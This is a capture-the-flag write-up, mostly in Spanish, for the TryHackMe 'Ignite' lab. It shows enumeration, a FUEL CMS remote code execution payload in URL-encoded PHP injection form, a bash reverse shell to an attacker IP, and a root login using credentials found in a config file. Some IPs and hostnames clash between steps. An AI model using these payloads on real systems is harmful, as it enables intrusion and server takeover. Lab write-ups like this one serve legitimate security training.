---
layout: single
title: Ignite - TryHackMe
excerpt: " Ignite is an easy machine in TryHackMe in which we'll use basic enumeration, learn more about FUEL CMS and how to explore it to gain access to the server. "
date: 2022-10-20
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-ignite/ignite.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:  
  - fuelcms
  - python
  - php
  - rce
  - mysql
---

Ignite is **an easy machine in TryHackMe in which we'll use basic enumeration, learn more about FUEL CMS and how to explore it to gain access to the server**.

# Summary
- IP: 10.10.240.84
- Ports: 80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  80 -> Apache httpd 2.4.18

# Recon
- Reconocimiento básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.116.216 -oG allPorts
``` 

- Reconocimiento profundo de puertos encontrados:

``` bash
$sudo nmap -p80 -sCV 10.10.116.216 -oN targeted
``` 

- Análisis de directorios web con gobuster:

```bash
$gobuster dir -u stocker.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 200
```

- Analizamos la página web; encontramos un CMS denominado "Fuel" con su respectiva versión, buscamos vulnerabilidades existentes para esta versión y encontramos una script de python, analizamos el código:

```python
main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"
```

- Vemos que hay un directorio vulnerable en el que se le puede inyectar código php para poder tener un RCE, ejecutamos el exploit:

```bash
$python3 exploit.py -u http://10.10.61.125/
```

- Ejecutamos en el RCE una reverse shell básica para poder interactuar mejor con la máquina:

```bash
bash -c "bash -i >& /dev/tcp/10.18.101.123/443 0>&1"
```

- Hacemos tratamiento de la tty y encontramos la primera flag.

# ESCALANDO PRIVILEGIOS:


- Hacemos una búsqueda típica de formas para escalar privilegios y no encontramos nada interesante.

- Comprobamos que puertos están abiertos de forma interna en la máquina:

```bash
netstat -nat
```

- Vemos el puerto 3306 abierto (MySQL), por lo que podríamos buscar información de la base de datos que hay por detrás:

```bash
$ find . 2>/dev/null | grep "database" 
```

- Encontramos un archivo "database.php", lo analizamos y encontramos credenciales de "root".
- Accedemos como root y encontramos la última flag.
